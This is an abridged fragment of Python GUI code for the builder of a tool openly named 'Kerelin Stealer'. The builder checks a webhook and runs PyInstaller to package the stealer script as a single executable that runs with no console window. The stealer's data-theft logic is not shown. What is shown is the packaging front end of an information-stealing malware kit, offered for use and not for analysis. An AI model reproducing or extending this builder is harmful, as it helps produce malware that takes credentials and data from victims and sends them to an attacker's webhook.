...
app = ctk.CTk()
app.title(f"Kerelin Stealer | Builder by @Wexnhium")
...
def build_exe():
    ...
    if validate_webhook(webhook):
        ...
        build_command = f'pyinstaller Kerelin.py --noconsole --onefile{icon_option}'
...
label = ctk.CTkLabel(master=app, text="Kerelin Stealer", text_color=("red"), font=("Times 20 italic", 26))
...
button = ctk.CTkButton(master=app, text="BUİLD EXE", text_color="white", hover_color="#363636", fg_color="red", command=build_exe)
